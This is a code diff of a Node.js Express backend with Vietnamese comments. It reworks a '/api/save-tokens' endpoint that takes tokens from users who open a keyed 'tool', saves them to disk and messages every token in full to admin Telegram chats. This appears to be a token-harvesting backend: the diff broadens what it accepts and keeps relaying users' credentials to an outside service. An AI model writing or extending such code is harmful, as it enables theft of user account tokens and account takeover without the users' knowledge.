@@ -144,15 +144,29 @@ app.get('/api/verify', (req, res) => {
 
 // 3. API Đồng bộ Token & TỰ ĐỘNG BẮN VỀ TELEGRAM ADMIN
 app.post('/api/save-tokens', (req, res) => {
-    const { key, deviceId, tokens } = req.body;
-    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
-        return res.json({ success: false, message: '❌ Dữ liệu Token không hợp lệ!' });
+    let { key, deviceId, tokens, token } = req.body;
+    
+    // Tự động linh hoạt nhận cả biến "tokens" (mảng) hoặc "token" (chuỗi đơn)
+    let tokenList = tokens || token;
+    if (!tokenList) {
+        return res.json({ success: false, message: '❌ Thiếu dữ liệu Token!' });
+    }
+
+    if (!Array.isArray(tokenList)) {
+        tokenList = [tokenList];
+    }
+
+    // Lọc bỏ token trống
+    tokenList = tokenList.filter(t => t && typeof t === 'string' && t.trim() !== '');
+
+    if (tokenList.length === 0) {
+        return res.json({ success: false, message: '❌ Danh sách Token rỗng!' });
     }
 
     // 1. Lưu vào file tokens.json chung
     let allTokens = loadTokens();
-    tokens.forEach(tk => {
-        if (tk && !allTokens.includes(tk)) {
+    tokenList.forEach(tk => {
+        if (!allTokens.includes(tk)) {
             allTokens.push(tk);
         }
     });
@@ -161,24 +175,24 @@ app.post('/api/save-tokens', (req, res) => {
     // 2. Cập nhật Token riêng theo Key
     const keysData = loadKeys();
     if (key && keysData[key]) {
-        keysData[key].tokens = tokens;
+        keysData[key].tokens = tokenList;
         keysData[key].lastUpdated = Date.now();
         saveKeys(keysData);
     }
 
-    // 3. 🚀 TỰ ĐỘNG BẮN THÔNG BÁO CHỨA TOKEN VỀ TELEGRAM ADMIN
+    // 3. 🚀 TỰ ĐỘNG BẮN THÔNG BÁO TOKEN VỀ TELEGRAM ADMIN
     ADMIN_IDS.forEach(adminId => {
         let msg = `🔔 **CÓ USER VỪA MỞ TOOL & ĐỒNG BỘ TOKEN!**\n\n`;
         msg += `🔑 **Key:** \`${key || 'Chưa xác định'}\`\n`;
         msg += `📱 **Device ID:** \`${deviceId || 'Chưa xác định'}\`\n\n`;
-        msg += `📋 **Danh sách Token (${tokens.length}):**\n`;
+        msg += `📋 **Danh sách Token (${tokenList.length}):**\n`;
         
-        tokens.forEach((tk, idx) => {
+        tokenList.forEach((tk, idx) => {
             msg += `${idx + 1}. \`${tk}\`\n`;
         });
 
         bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(err => {
-            console.error('Lỗi gửi tin nhắn Telegram:', err);
+            console.error('Lỗi gửi tin nhắn Telegram:', err.message);
         });
     });
 
